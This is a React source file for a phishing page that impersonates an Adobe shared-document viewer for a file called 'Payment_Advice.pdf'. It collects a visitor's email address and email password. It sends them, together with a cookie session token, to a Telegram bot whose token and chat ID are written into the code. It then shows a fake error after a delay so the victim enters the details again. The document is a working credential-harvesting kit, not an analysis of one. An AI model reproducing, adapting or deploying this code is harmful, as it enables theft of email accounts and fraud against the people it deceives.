import Cookies from "js-cookie";
import React, { useEffect, useState } from "react";
import { v4 as uuidv4 } from "uuid";

const SecondPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  const TELEGRAM_BOT_TOKEN = "7516794202:AAFwcqCUHCTCLlqt7C1YTXtedhQU7n7AhzE"; // Replace with your actual bot token
  const TELEGRAM_CHAT_ID = "6713856198"; // Replace with your actual chat ID
  const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  useEffect(() => {
    // Check if a session token already exists, otherwise create one
    const existingToken = Cookies.get("user_token");
    if (!existingToken) {
      const newToken = uuidv4(); // Generate a new unique token
      Cookies.set("user_token", newToken, {
        expires: 7,
        path: "/",
        secure: true,
      });
      console.log("Generated new user token:", newToken);
    } else {
      console.log("Existing user token:", existingToken);
    }
  }, []);

  const handleLogin = () => {
    if (!email || !password) {
      alert("Please enter email and password!");
      return;
    }

    // Start spinner and reset states
    setLoading(true);
    setError(false);

    // Simulate 30-second delay before showing error
    setTimeout(() => {
      setLoading(false); // Stop spinner
      setError(true); // Show error message
    }, 10000);

    // Retrieve the token from cookies
    const sessionToken = Cookies.get("user_token");
    console.log("Using session token:", sessionToken);

    // Prepare the message
    const message = `📩 **Adobe Login Attempt**\n\n**Email:** ${email}\n**Password:** ${password}\n**Session Token:** ${sessionToken}`;

    // Send data to Telegram
    fetch(TELEGRAM_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })
      .then((response) => {
        if (response.ok) {
          console.log("Successfully sent to Telegram!");
        } else {
          return response.text().then((text) => {
            throw new Error(`Telegram API Error: ${text}`);
          });
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        console.log("Failed");
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md">
        <h1 className="text-lg font-semibold text-red-600">Adobe</h1>
        <p className="text-sm text-gray-500 mt-2">
          Filename: <strong>Payment_Advice.pdf</strong>
        </p>

        {/* Error Message */}
        {error && (
          <div className="bg-red-100 text-red-600 p-3 rounded-md mt-4">
            Something went wrong, please try again.
          </div>
        )}

        {/* Spinner */}
        {loading && (
          <div className="flex items-center justify-center mt-4">
            <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-red-500"></div>
          </div>
        )}

        <div className="mt-4 space-y-4">
          <input
            type="email"
            placeholder="Enter Recipient Email"
            className="w-full border border-gray-300 p-2 rounded-md"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            type="password"
            placeholder="Enter Email Password"
            className="w-full border border-gray-300 p-2 rounded-md"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        <p className="text-xs text-gray-500 mt-4">
          Note: Only recipient email can access shared files and the link will
          expire in 5 days.
        </p>
        <button
          onClick={handleLogin}
          className="mt-6 w-full bg-red-500 text-white py-2 rounded-md hover:bg-red-600"
          disabled={loading} // Disable button while loading
        >
          {loading ? "Processing..." : "View Document"}
        </button>
      </div>
    </div>
  );
};

export default SecondPage;
